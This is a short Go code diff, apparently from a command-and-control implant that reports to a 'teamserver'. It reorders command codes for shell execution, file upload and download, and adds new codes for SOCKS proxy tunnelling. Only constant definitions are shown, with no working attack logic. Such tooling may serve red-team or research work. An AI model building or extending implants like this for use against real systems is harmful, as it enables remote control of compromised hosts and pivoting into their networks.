@@ -15,21 +15,28 @@ import (
 )
 
 const (
-	CMD_TYPE_SLEEP        = 4
-	CMD_TYPE_SHELL        = 78
-	CMD_TYPE_UPLOAD_START = 10
-	CMD_TYPE_UPLOAD_LOOP  = 67
-	CMD_TYPE_DOWNLOAD     = 11
 	CMD_TYPE_EXIT         = 3
+	CMD_TYPE_SLEEP        = 4
 	CMD_TYPE_CD           = 5
+	CMD_TYPE_UPLOAD_START = 10
+	CMD_TYPE_DOWNLOAD     = 11
+	CMD_TYPE_CONNECT      = 14
+	CMD_TYPE_SEND         = 15
+	CMD_TYPE_CLOSE        = 16
+	CMD_TYPE_LISTEN       = 17
 	CMD_TYPE_PWD          = 39
 	CMD_TYPE_FILE_BROWSE  = 53
+	CMD_TYPE_UPLOAD_LOOP  = 67
+	CMD_TYPE_SHELL        = 78
 )
 
 // Callback type constants (agent → teamserver)
 const (
 	CALLBACK_OUTPUT            = 0
 	CALLBACK_FILE              = 2  // download start
+	CALLBACK_CLOSE             = 4  // socks connection closed
+	CALLBACK_READ              = 5  // socks data read
+	CALLBACK_CONNECT           = 6  // socks connection established
 	CALLBACK_FILE_WRITE        = 8  // download chunk
 	CALLBACK_FILE_CLOSE        = 9  // download complete
 	CALLBACK_PWD               = 19
